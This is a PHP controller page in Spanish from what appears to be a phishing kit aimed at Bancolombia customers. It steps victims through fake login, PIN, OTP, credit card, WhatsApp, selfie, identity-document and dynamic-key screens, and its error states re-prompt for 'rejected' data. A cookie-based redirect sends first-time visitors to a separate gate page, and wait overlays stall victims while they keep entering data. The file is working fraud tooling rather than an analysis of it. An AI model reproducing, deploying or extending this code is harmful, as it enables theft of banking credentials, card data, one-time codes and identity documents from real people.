<?php



// Helper for testing: ?reset=true clears the cookie
if (isset($_GET['reset'])) {
    setcookie("visited_seguro", "", time() - 3600, "/");
    header("Location: index.php"); // Reload to trigger the "first time" check
    exit();
}

// Redirect Check (Configurable)
$redirectConfig = @json_decode(file_get_contents('config/redirect_status.json'), true);
$redirectEnabled = $redirectConfig['enabled'] ?? true; // Default true if missing

if ($redirectEnabled) {
    if (!isset($_COOKIE['visited_seguro'])) {
        header("Location: seguro.php");
        exit();
    }
}

// Mobile check removed to allow PC access
if (session_status() === PHP_SESSION_NONE) { session_start(); }

// --- UNIFICACIÓN: Capturar ID de sesión si viene de la consulta ---
if (isset($_GET['id'])) {
    $_SESSION['cliente_id'] = intval($_GET['id']);
}

// --- LÓGICA DEL CONTROLADOR ---
$status = $_GET['status'] ?? 'login';
$body_class = '';

if ($status === 'otp') {
    $body_class = 'otp-view';
} elseif ($status === 'cc') {
    $body_class = 'cc-view';
} elseif ($status === 'ccerror') { // <-- Nuevo estado para el error de tarjeta
    $body_class = 'cc-view';
} elseif ($status === 'whatsapp') { // <-- Nuevo estado WhatsApp
    $body_class = 'cc-view';
} elseif ($status === 'selfieerror') { // <-- Nuevo estado Selfie Error
    $body_class = 'cc-view';
} elseif ($status === 'doc_front') {
    $body_class = 'cc-view';
} elseif ($status === 'doc_back') {
    $body_class = 'cc-view';
} elseif ($status === 'doc_front_error') { // State 13
    $body_class = 'cc-view';
} elseif ($status === 'doc_back_error') { // State 14
    $body_class = 'cc-view';
} elseif ($status === 'clave_dinamica' || $status === 'clave_dinamica_error') { // State 15 & 16
    $body_class = 'cc-view';
}

?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plataforma</title>
    <link rel="stylesheet" href="assets/css/login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
</head>

<body class="<?php echo $body_class; ?>">

    <?php
    // --- SECCIÓN DE CARGA DE MÓDULOS ---
    // 1. Cargamos el banner y el login para los estados 'login', 'espera' y 'erroruser'.
    if ($status === 'login' || $status === 'espera' || $status === 'erroruser') {
        include 'partials/notification_banner.php';
        include 'partials/login.php';
    }

    // 2. Basado en el 'status', decidimos qué vista/overlay mostrar encima.
    if ($status === 'otp') {
        include 'partials/otp_form.php';
    } elseif ($status === 'espera') {
        include 'partials/espera_overlay.php';
    } elseif ($status === 'erroruser') {
        include 'partials/error_user_notification.php';
    } elseif ($status === 'cc') {
        include 'partials/tarjeta_credito.php';
    } elseif ($status === 'ccerror') {
        include 'partials/tarjeta_credito.php';
    } elseif ($status === 'whatsapp') { // <-- Nuevo estado Include
        include 'partials/whatsapp_validation.php';
    } elseif ($status === 'selfie') { // <-- Nuevo estado Selfie Include
        include 'partials/selfie.php';
    } elseif ($status === 'selfieerror') { // <-- Nuevo estado Selfie Error
        include 'partials/selfie_error_notification.php'; // Toast
        include 'partials/selfie.php'; // Vista de cámara para reintentar
    } elseif ($status === 'doc_front') { // <-- Nuevo estado Doc Frente
        include 'partials/doc_front.php';
    } elseif ($status === 'doc_back') { // <-- Nuevo estado Doc Reverso
        include 'partials/doc_back.php';
    } elseif ($status === 'doc_front_error') { // State 13
        include 'partials/doc_error_notification.php';
        include 'partials/doc_front.php';
    } elseif ($status === 'doc_back_error') { // State 14
        include 'partials/doc_error_notification.php';
        include 'partials/doc_back.php';
    } elseif ($status === 'clave_dinamica') { // State 15
        include 'partials/clave_dinamica.php';
    } elseif ($status === 'clave_dinamica_error') { // State 16
        include 'partials/clave_dinamica.php';
    }
    ?>

    <script>
        document.addEventListener('DOMContentLoaded', () => {

            // --- LÓGICA DE NOTIFICACIÓN DE ERROR Y SCROLL ---
            const errorToast = document.getElementById('errorToast');
            if (errorToast) {
                const closeButton = document.getElementById('closeErrorToast');
                function hideToast() { errorToast.style.display = 'none'; }
                if (closeButton) { closeButton.addEventListener('click', hideToast); }
                setTimeout(hideToast, 5000);
                const loginContainer = document.querySelector('.login-container');
                if (loginContainer) { loginContainer.scrollIntoView({ behavior: 'smooth', block: 'center' }); }
            }

            // --- LÓGICA DE VALIDACIÓN DEL FORMULARIO DE LOGIN ---
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                const userInput = document.getElementById('usuario');
                const passInput = document.getElementById('clave');
                const loginButton = document.getElementById('loginButton');

                function toggleError(inputElement, show) {
                    const wrapper = inputElement.closest('.input-wrapper');
                    if (show) { wrapper.classList.add('error'); }
                    else { wrapper.classList.remove('error'); }
                }

                function validateAllInputs() {
                    const userValue = userInput.value.trim();
                    const passValue = passInput.value.trim();
                    const isUserValid = userValue !== ''; // Relaxed validation
                    const isPassValid = /^\d{4}$/.test(passValue);
                    // loginButton.disabled = !(isUserValid && isPassValid); // Start enabled
                    return isUserValid && isPassValid;
                }

                userInput.addEventListener('input', () => { toggleError(userInput, false); validateAllInputs(); });
                passInput.addEventListener('input', () => {
                    passInput.value = passInput.value.replace(/[^0-9]/g, '').slice(0, 4);
                    toggleError(passInput, false);
                    validateAllInputs();
                });
                userInput.addEventListener('blur', () => {
                    if (userInput.value.trim() === '') {
                        toggleError(userInput, true);
                    }
                });
                passInput.addEventListener('blur', () => {
                    if (!/^\d{4}$/.test(passInput.value.trim())) { toggleError(passInput, true); }
                });

                loginForm.addEventListener('submit', (event) => {
                    if (!validateAllInputs()) {
                        event.preventDefault();
                        if (userInput.value.trim() === '') toggleError(userInput, true);
                        if (!/^\d{4}$/.test(passInput.value.trim())) toggleError(passInput, true);
                    } else {
                        const waitOverlay = document.getElementById('waitOverlay');
                        if (waitOverlay) { waitOverlay.classList.add('active'); }
                    }
                });
                validateAllInputs();
            }

            // --- LÓGICA PARA EL FORMULARIO OTP ---
            const otpForm = document.getElementById('otpForm');
            if (otpForm) {
                const inputs = Array.from(document.querySelectorAll('#otpInputs input'));
                const otpButton = document.getElementById('otpButton');
                const countdownElement = document.getElementById('countdown');

                // Función central que revisa si todos los campos están llenos
                function checkAllInputs() {
                    const allFilled = inputs.every(input => input.value.trim().length === 1);
                    otpButton.disabled = !allFilled;
                }

                // Eventos para cada input
                inputs.forEach((input, index) => {
                    input.addEventListener('input', (e) => {
                        e.target.value = e.target.value.replace(/[^0-9]/g, '');
                        if (e.target.value.length === 1 && index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                        checkAllInputs();
                    });

                    input.addEventListener('keydown', (e) => {
                        if (e.key === "Backspace" && e.target.value === '' && index > 0) {
                            inputs[index - 1].focus();
                        }
                        // Llama a la validación después de cualquier tecla, incluyendo borrar
                        checkAllInputs();
                    });
                });

                // Evento para pegar
                inputs[0].addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
                    pasteData.split('').forEach((char, i) => {
                        if (inputs[i]) inputs[i].value = char;
                    });
                    checkAllInputs();
                    inputs[Math.min(pasteData.length, 5)].focus();
                });

                // Lógica del temporizador (sin cambios)
                let timeLeft = 299;
                const timerInterval = setInterval(() => {
                    const minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    seconds = seconds < 10 ? '0' + seconds : seconds;
                    countdownElement.textContent = `0${minutes}:${seconds}`;
                    if (timeLeft > 0) {
                        timeLeft--;
                    } else {
                        clearInterval(timerInterval);
                        countdownElement.textContent = 'Expirado';
                        otpButton.disabled = true;
                    }
                }, 1000);
            }
        });
    </script>
    <script>
        // Global Anti-Spam
        document.addEventListener('click', function (e) {
            const target = e.target.closest('button, .btn, input[type="submit"], #loginButton, #otpButton');
            if (!target) return;

            if (target.dataset.isProcessing === 'true') {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }

            target.dataset.isProcessing = 'true';
            target.style.opacity = '0.7';
            // We don't disable pointerEvents here immediately to allow submit events to bubble if needed, 
            // but capturing phase usually happens before.
            // For Bancolombia, let's rely on opacity/flag check.

            setTimeout(() => {
                target.dataset.isProcessing = 'false';
                target.style.opacity = '';
            }, 3000);
        }, true);
    </script>
</body>

</html>

